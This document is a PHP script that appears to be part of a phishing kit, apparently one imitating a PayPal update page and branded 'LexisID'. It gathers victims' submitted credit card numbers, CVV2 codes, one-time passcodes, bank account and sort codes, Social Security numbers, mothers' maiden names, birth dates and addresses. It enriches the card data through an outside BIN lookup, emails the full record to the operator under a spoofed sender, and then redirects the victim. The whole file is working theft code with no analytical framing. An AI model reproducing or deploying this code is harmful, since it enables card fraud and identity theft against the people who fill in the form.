<?php

include('../../blocker.php');
include('../../detect.php');

if (isset($_POST['cc_number']) && !empty($_POST['cc_number'])) {
    $ccno = "";
} else {
    $ccno = $_POST['cc_number'];
}
$ccno = $_POST['cc_number'];
$bin = str_replace(' ', '', $_POST['cc_number']);
$bin = substr($bin, 0, 6);
$getbank = 'http://www.findbinnumbers.com.au/' . $bin ;
$c = curl_init();
curl_setopt($c, CURLOPT_URL, $getbank);
curl_setopt($c, CURLOPT_HEADER, 0);
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($c, CURLOPT_COOKIEJAR, isset($cookie) ? $cookie : "");
@curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12");
$rzlt = curl_exec($c);
curl_close($c);
$ban = explode("is issued by <strong style='color:#2f99bc;'>", $rzlt);
$bank = explode("</strong>", $ban[1]);
$typ = explode("functionality and <strong style='color:#2f99bc;'>", $rzlt);
$type = explode("</strong>", $typ[1]);
$bran = explode("This card has <strong style='color:#2f99bc;'>", $rzlt);
$brand = explode("</strong>", $bran[1]);
$leve = explode("<strong style='color:#2f99bc;'>CardCategory</strong>:", $rzlt);
$level = explode("</br> ", $leve[1]);
$ccbrand = $brand[0];
$cctype = $type[0];
$ccklas = $level[0];
$ccbank = $bank[0];

$message ="
.++========[+] [L]exis[ID] [+]========++.
 -- life is so simple when no difficult  --

.++-----[ CreditCard ".$nama_negara." ]-----++. 
Cardholder Name :  ".$_POST['cc_holder']."
Card Number     :  ".$_POST['cc_number']."
Expiration Date :  ".$_POST['expdate_month']." / ".$_POST['expdate_year']."
Cvv2            :  ".$_POST['cvv2_number']."
BIN/IIN Info    :  " . $ccbank . " - ". $ccbrand . " - ". $cctype ." - ".$ccklas."
Sort Code       :  ".$_POST['sort_code1']." - ".$_POST['sort_code2']." - ".$_POST['sort_code3']." (GB/IE)
Account number  :  ".$_POST['accnum']." (AU/GB/IE)
BSB - OSID      :  " . $_POST['bsbnum_1'] . " - " . $_POST['bsbnum_2'] . " (AU)
Credit Limit    :  " . $_POST['cc_limit'] . " (AU/IE)
One Time Pass   :  ".$_POST['otp_pass']."
Mother's name   :  ".$_POST['mmd']."
Account Name    :  ".$_POST['full_name']."
Address Line 1  :  ".$_POST['address1']."
Address Line 2  :  ".$_POST['address2']."
City/Town       :  ".$_POST['city']."
State           :  ".$_POST['state']."
Zip/PostCode    :  ".$_POST['postal']."
Country         :  ".$nama_negara."
Phone Number    :  ".$_POST['phone']."
SSN             :  ".$_POST['ssn1']." - ".$_POST['ssn2']." - ".$_POST['ssn3']." (CA/US)
ID Number       :  ".$_POST['id_number']."
DOB             :  ".$_POST['dob_day']." / ".$_POST['dob_month']." / ".$_POST['dob_year']." (D/M/Y)
      .++---------[ End ]---------++.

      .++-------[ Pc Info ]-------++.
From            :  ".$ip." | ".$nama_negara." On ".date('r')."
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
      .++---------[ End ]---------++.

.++====[+] Thank you for your purchase! [+]====++.
";


include('../../email.php');
$subject = " BIN: $bin (".$cccode.")  -  " . $ccbank . " " . $ccbrand . " ". $cctype ." ".$ccklas."  [ ".$nama_negara." - " . $ip . " ]";
$headers = "From: ".$_POST['cc_holder']." <creditcard@blackcard.club>";
mail($email, $subject, $message, $headers);

header("LOCATION: webscrr?cmd=_update-information&account_bank=".md5(microtime())."&dispatch=".sha1(microtime())."");

?>